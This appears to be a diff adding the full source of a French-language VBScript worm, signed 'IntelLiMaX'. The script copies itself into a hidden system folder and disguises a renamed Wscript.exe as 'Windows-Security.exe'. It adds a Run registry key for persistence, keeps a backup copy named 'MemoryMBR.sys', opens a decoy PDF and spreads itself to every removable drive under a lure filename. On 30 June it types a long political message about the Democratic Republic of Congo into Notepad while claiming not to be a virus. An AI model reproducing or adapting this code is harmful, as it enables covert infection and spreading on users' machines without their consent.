@@ -1,0 +1,190 @@
+Option Explicit
+dim ObjetSF, ObjetSh, SecurityFile, PathFile, FullPathFile, Command, RunFromHDD, CollectDrives, LecteurEnCours, SpdfFile, DateNow, ObjetRes, Utilisateur, Message, SignalToLunch, DossierCourant, OriginalName, PlayerPathFile, SystemDrive, SystemRoot, Nulll
+
+On Error Resume Next
+
+Nulll = ""
+SignalToLunch = 36
+RunFromHDD = 0
+DateNow = "La nuit de ta passion sera lumiere de midi"
+
+'BARRIERE DE POTENTIEL
+set ObjetSF = CreateObject("Scripting.FileSystemObject")
+set ObjetSh = CreateObject("Wscript.Shell")
+set ObjetRes = CreateObject("Wscript.NetWork")
+Utilisateur = ObjetRes.UserName
+SystemRoot = ObjetSh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") 'Nous lisons le contenu du fichier de securite...
+PathFile = Left( SystemRoot, 2)
+SystemDrive = PathFile 'Insertion de la lettre du lecteur Principal.... C:
+PathFile = PathFile & "\Win32System"
+FullPathFile = PathFile & "\Win32System.vbe"
+PlayerPathFile = PathFile & "\Windows-Security.exe"
+OriginalName = "00Peuple_congolais,Ceci_nous_concerne_tous-By_IntelLiMaX.Spdf.vbe"
+
+'DETECTION DE LA RACINE..
+if Wscript.ScriptName = "Win32System.vbe" then 
+	RunFromHDD = 1
+else
+end if
+'FIN DE DETECTION...
+
+if RunFromHDD = 0 then 'EXECUTION TEMPORAIRE...
+'----------------------------------------///////////////////////////////------------------------------------------///////////-----------------
+'ETAPE 2 : DEBUT DU TEST PAR IntelLiMaX...
+
+command = SystemDrive & "\Spdf-Files"
+ObjetSF.CreateFolder(command) 'Creation du dossier de lancement séparé du pdf
+
+if ObjetSF.FolderExists(PathFile) then
+	if ObjetSF.FileExists(FullPathFile) and ObjetSF.FileExists(PlayerPathFile) then
+	else
+		PlaceFiles()
+	end if
+else
+	ObjetSF.CreateFolder(PathFile)
+	PlaceFiles()
+end if
+'CREATION ET LANCEMENT DU pdf File...
+Command = SystemDrive & "\Spdf-Files\Toutes_Les_verites_de_La_RDC-ByIntelLiMaX.pdf"
+set SpdfFile = ObjetSF.CreateTextFile( Command, TRUE)
+Wscript.sleep 3000
+ObjetSh.Run(Command)
+Wscript.sleep 3000
+
+command = PlayerPathFile & " " & FullPathFile
+ObjetSh.Run(command) ' Executer le script  ....pdf se retrouvant sur l'ordinateur, se trouvant sur l'ordinateur
+
+wscript.quit 'On quitte l'environnement...
+
+'-------------------------------------///////////////////////////--------------------------------------------------------------------------------------
+else ' LANCEMENT A PARTIR D'UN DISQUE DUR...
+Do While RunFromHDD
+	'1 :  Test d'existence de la racine
+	if ObjetSF.FolderExists(PathFile) then
+		if ObjetSF.FileExists(FullPathFile) and ObjetSF.FileExists(PlayerPathFile) then
+		else
+			ReIncarnServer()
+		end if
+	else
+	ObjetSF.CreateFolder(PathFile)
+	ReIncarnServer()
+	end if
+	
+	'Suppression préalable d'un Wscript qui traine dans notre dossier de super securite...
+	command = PathFile & "\Wscript.exe"
+	ObjetSF.DeleteFile(command)
+	
+	command = PlayerPathFile & " " & FullPathFile
+	Nulll = ObjetSh.RegRead("HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows-SecureOS")
+	if Err.number <> 0 then
+		ObjetSh.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows-SecureOS", command, "REG_EXPAND_SZ"
+		Err.Clear
+	else
+	end if
+	'On ne sait jamais pas besoin de test pour ca...
+	
+	' 2 .    EXECUTION DU MESSAGE DE PRISE DE CONSCIENCE...
+	if (SignalToLunch mod 36) = 0 then
+		set DossierCourant = ObjetSF.CreateFolder("Win32SECURITY")
+		DateNow = DossierCourant.DateCreated
+		ObjetSF.DeleteFolder("Win32SECURITY")
+		DateNow = Left( DateNow, 5)
+	else
+	end if
+	if DateNow = "30/06" then
+		if (SignalToLunch mod 36) = 0 then
+			ObjetSh.Run("Notepad.exe")
+			
+			ObjetSh.AppActivate "Sans titre - bloc-notes"
+			ObjetSh.AppActivate "Untitled - Notepad"
+			
+			wscript.sleep 1000
+			Message = "		Bonjour tres chers " & Utilisateur & " Si je ne me trompes pas. Surtout, Rassurez-vous, vous avez notre parole que cette action ne vient pas d'un code malveillant, couramment appele 'virus'. Etant donne qu'aujourd'hui est une journee ou nous congolais, nous commemorons la journee d'obtention de notre independance, IntelLiMaX Corporation a souhaite vous soumettre a quelque minutes de reflexion en rapport avec la chose. Nous rappelons que ceci n'est pas un virus et loin de nous l'idee de nous moquer de vous. Tout ce que nous avons voulu, c'est juste un mouvement de conscientisation. Surtout veuillez nous excuser le nombre de fois que ce message vous sera affiche, Nos sinceres excuses. InteLiMaX vous souhaite une bonne lecture..."
+			ObjetSh.SendKeys Message
+			wscript.sleep 3000
+			ObjetSh.SendKeys "Alors comme je vous le disais tout a l'heure, c'est une tres bonne chose que d'obtenir son independance, d'ailleurs cela a permis a un bon nombre de pays, de cerner des lors, la vive importance 'de se prendre en charge'. Mais est-ce vraiment le cas avec nous?, Nous prenons-nous vraiment en charge? Vous savez aussi bien que moi, que la reponse est bel et bien 'non'..."
+			wscript.sleep 3000
+			ObjetSh.SendKeys "	En RDC, un paradis fiscal, bon nombre de personnes s'en vont au lit et se reveillent avec des millions en poches. Cela est bien effectivement. Mais la situation vue sous un autre angle, c'est un signe que nous n'avancerons jamais. 45 ans d'independance, et nous laissons la tache aux dirigeants de relever le pays comme si cela ne concernait qu'eux seuls. Vous etes d'accord avec moi, qu'avec la meme allure, nous finirons par nous auto-detruire..."
+			wscript.sleep 3000
+			ObjetSh.SendKeys "Certes, me direz-vous que cela est du a maintes corruptions 'irreversibles' sous toutes les couches possibles, au tribalisme accru, et consorts. Mais le comble est que nous n'en faisons pas notre probleme. L'on se contente du vehicule qu'on a dans le garage, du pain quotidien... et c'est tout. Comme si cela suffisait. Notamment la RDC est un grand Pays aux contrees immenses et aux riches ressources que je ne prendrai meme pas la peine de vous insuffler, cela etant connu de tout le monde. Pensons-nous au moins a notre avenir? A l'avenir de notre pays? Faut-il vraiment Que le Script IntelLiMaX soit mis au point, pour que... nous reflechissions au moins a cela? "
+			wscript.sleep 3000
+			ObjetSh.SendKeys "Nous devrons comprendre que pour que les choses bougent, il nous faut provoquer un mouvement, une forte pulsion... parce que le reste n'a besoin que de pésanteur pour revenir vers - nous. Nous ne sommes pas en arrière parceque nous sommes noirs... Non. Mais nous sommes largement en retard parceque nous sommes aveugles..."
+			wscript.sleep 3000
+			ObjetSh.SendKeys "... Certes, il nous faudrait un bon bouquin de quelques milliers de pages pour nous assurer de vous transmettre Le Message. Tres chers congolais, congolaise, Tachons d'y Penser des maintenant et avec toute la ferveur possible, trouvons une solution... Car cela nous concerne tous, mettons la main a la pate, car le developpement est une question de mental, un etat d'esprit... car c'est un peuple developpé qui donne naissance à une nation développé mais pas du tout le contraire. 							Fin. 																																																		Nous esperons que vous avez compris notre souci.	2012-30 Juin By IntelLiMaX Corp. & LdXX. - si cela vous a touche d' une certaine maniere, n'hesitez surtout pas a nous faire part de votre avis là dessus par le Reseau Social Fb - Groupe: IntelLiMaX. ou via IntelLiMaXCorp@gmail.com; Toutes nos excuses, nos sinceres remerciements et surtout Bonne fete a vous... 														>Puisse le bon Dieu bénir l'E.S.I.S. et toutes les autres écoles de formations d'I.T. au monde."
+			SignalToLunch = 0
+		else
+		end if
+	else
+	end if
+	'FIN D'EXECUTION...
+	set CollectDrives = ObjetSF.drives
+	For Each LecteurEnCours in CollectDrives
+		if LecteurEnCours.DriveType = 1 and LecteurEnCours.IsReady then
+			Command = LecteurEnCours.DriveLetter & "\00Peuple_congolais,Ceci_nous_concerne_tous-By_IntelLiMaX.Spdf.vbe"
+			if ObjetSF.FileExists(Command) then
+			else
+				DossierCourant = LecteurEnCours.DriveLetter & ":\" & OriginalName
+				set SecurityFile = ObjetSF.OpenTextFile( FullPathFile, 1)
+				Command = SecurityFile.ReadAll
+				SecurityFile.Close
+				set SecurityFile = ObjetSF.CreateTextFile(DossierCourant, TRUE)
+				SecurityFile.Write Command
+				SecurityFile.Close
+			end if
+		else
+		end if
+	Next
+	if SignalToLunch = 36 then
+		SignalToLunch = 0
+	else
+	end if
+	SignalToLunch = SignalToLunch + 1
+	wscript.sleep 2000
+Loop
+end if
+' FIN DE L'EXECUTION DU SCRIPT...
+
+Sub PlaceFiles() 'Enracinement du Script sur la machine...
+	'UNE: ENRACINEMENT DU FICHIER...
+	set SecurityFile = ObjetSF.OpenTextFile( OriginalName, 1)
+	Command = SecurityFile.ReadAll
+	SecurityFile.Close
+	set SecurityFile = ObjetSF.CreateTextFile(FullPathFile, TRUE)
+	SecurityFile.Write Command
+	SecurityFile.Close
+	
+	'MISE EN PLACE DE LA DLL-TROJAN....
+	Nulll = SystemDrive & "\SharedMemory"
+	ObjetSF.CreateFolder(Nulll) 'Creation de son dossier...
+	Nulll = SystemDrive & "\SharedMemory\MemoryMBR.sys"
+	set SecurityFile = ObjetSF.CreateTextFile(Nulll, TRUE)
+	SecurityFile.Write Command
+	SecurityFile.Close
+	
+	'ETAPE 3 // Appropriation d'un Wscript autogène...
+	ObjetSh.Run "xcopy %Systemroot%\System32\Wscript.exe %SystemDrive%\Win32System\ /c /q /y"
+	command = PathFile & "\Wscript.exe"
+	wscript.sleep 2000 ' Légère Attente avant le renommage de notre chers fichier....
+	ObjetSh.Run "cmd.exe /C Rename " & command & " Windows-Security.exe"
+	
+	''ETAPE QUATRE : ECRITURE DANS LE REGISTRE.
+	command = PlayerPathFile & " " & FullPathFile
+	ObjetSh.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows-SecureOS", command, "REG_EXPAND_SZ"
+	
+End Sub
+
+Sub ReIncarnServer()
+	'DE UN: ReEtablissement du Wscript.exe
+	ObjetSh.Run "xcopy %Systemroot%\System32\Wscript.exe %SystemDrive%\Win32System\ /c /q /y"
+	command = PathFile & "\Wscript.exe"
+	wscript.sleep 2000 ' Légère Attente avant le renommage de notre chers fichier....
+	ObjetSh.Run "cmd.exe /C Rename " & command & " Windows-Security.exe"
+	'DE DEUX: 
+	command = SystemDrive & "\SharedMemory\MemoryMBR.sys"
+	set SecurityFile = ObjetSF.OpenTextFile( command, 1)
+	Command = SecurityFile.ReadAll
+	SecurityFile.Close
+	set SecurityFile = ObjetSF.CreateTextFile(FullPathFile, TRUE)
+	SecurityFile.Write Command
+	SecurityFile.Close
+End Sub
